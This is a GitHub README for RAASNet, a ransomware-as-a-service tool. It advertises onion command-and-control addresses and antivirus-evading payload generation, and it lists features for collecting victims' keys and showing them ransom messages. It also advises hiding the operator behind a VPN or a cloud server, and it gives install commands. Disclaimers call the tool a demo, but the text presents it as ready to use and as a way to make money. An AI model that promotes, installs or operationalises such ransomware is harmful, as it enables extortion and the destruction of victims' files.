<h1 align="center">
   RAASNet
</h1>

<h2 align="center">
   Visit our Onion site for a complete C&C !
   
   
   New Onion Domain:
   
   hplqdv5fo3vw3fjyamyer7yuc7xtvtop2j3fipc7psf3pxvhoqjoqkid.onion
   
   Relay:
   
   ust2an5ovtpxroqw7q2wfzi25lvvcuj7h2avjy66k42f3rabzdpz6pad.onion
</h2>

![license](https://img.shields.io/github/license/leonv024/RAASNet "License")
![compatible](https://img.shields.io/badge/Windows%2C%20Mac%20%26%20Linux-compatible-brightgreen "Platform")
![status](https://img.shields.io/website?down_message=Offline&label=Service%20Status&up_message=Online&url=https%3A%2F%2Fzeznzo.nl%2Flogin.py "Status")
![last commit](https://img.shields.io/github/last-commit/leonv024/RAASNet "Last Commit")
![Twitter](https://img.shields.io/badge/Twitter-@TheRealZeznzo-blue "Twitter")

<h3 align="center">
   <a href="https://www.buymeacoffee.com/Zeznzo" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/lato-blue.png" alt="Buy Me A Coffee" style="height: 21px !important;width: 187px !important;" ></a>
</h3>

<p align="center">
  Ransomware As A Service
</p>

![alt text](./demo/RAASNET-demo.png)
![alt text](./demo/panel1.png)
![alt text](./demo/panel2.png)
![alt text](./demo/new_profile.png)
![alt text](./demo/demonware_demo.jpeg)

<h1 align="center">
  Super Fast Encryption!
</h1>
<br>

![alt text](./demo/PyCrypto-vs-PyAES_demo_10fps.gif "Encryption Speed Demo")
<br>

<h1 align="center">
   Usage Demo
</h1>

<a href="https://www.youtube.com/watch?v=2GQaWL6eSxA" target="_blank"><img src="https://i.ytimg.com/vi/2GQaWL6eSxA/hqdefault.jpg" 
alt="RAASNet demo" width="240" height="180" border="10" /></a>

<h1 align="center">
   Please read
</h1>
<br>
<p align=center>
   This was made to demonstrate ransomware and how easy it is to make. It works on Windows, Linux and MacOS. It's recommended to compile payload.py to EXE to make it more portable.
</p>

<p align=center>
   I do work on security awareness trainings and test the IT security and safety for other companies and you guessed it; this was made for the demo section of my presentation, NOT TO EARN MONEY OR BRICK PEOPLES COMPUTERS.
</p>

<p align=center>
   This script does not get detected by any anti-virusses. Self made scripts go undetected 99% of the time. It's easy to write something nasty like ransomware, adware, malware, you name it. Again, this script was for research only. Not ment to be used in the open world. I am not responsible for any damage you may cause with this knowledge. 
</p>

<p align=center>
   I recommend a VPN that allows port forwarding (For example; PIA VPN) when using this outside your network, or better, a cloud computer hosted elsewhere, like Amazon AWS. 
</p>

<p align=center>
   The conclusion of this project is that it is easy to brick a system and earn money doing it. This script doesn't use any exploits to achieve its goal, but can easily be coded into it as a nice feature.
</p>
<br>

<h1 align="center">
   Features
</h1>
<br>

+ Generate a ransomware payload
+ With or without GUI payload
+ FUD (Fully Undetectable by Anti-Virus)
+ Works on Windows, MacOS and Linux
+ Super fast encryption with PyCrypto
+ Compile to EXE, APP or Unix/Linux executable
+ Custom icon for your EXE payload
+ Receive keys of victims
+ Decrypt files
+ Demo mode (payload won't encrypt anything)
+ Fullscreen mode (Warning takes over the screen)
+ Custom warning message for your victim
+ Custom image in your payload
+ Ghost mode (Rename by adding .DEMON extention instead of encrypting the files)
+ Multiple encryption methods
+ Select file extentions to target
+ Decide if payload should self-destruct (Console mode feature only)
+ Decide wich drive to target for encryption (working directory)
+ Verified server access through port forwarding VPN

<h1 align="center">
   Installation
</h1>

Download and install the latest version of Python 3.<br>
<br>
Then do:<br>
```Shell
git clone https://github.com/leonv024/RAASNet.git
```

```Shell
pip3 install -r requirements.txt
```

```Shell
python3 RAASNet.py
```

On Linux, you might need to install these packages:
```Shell
sudo apt install python3-tk python3-pil python3-pil.imagetk
```

Testing connection with remote server:
```Shell
# Change the host and port in test_socket.py, default is 127.0.0.1 on port 8989
python3 test_socket.py
```


----
# Disclaimer
I am not responsible for any damage you might cause with this tool. Use at own risk and for testing and learning only! I made this to test AV's and demo purposes only! Use this to avoid ransomware and make better tools against it because current AV tools and ransomware shields are not good enough!
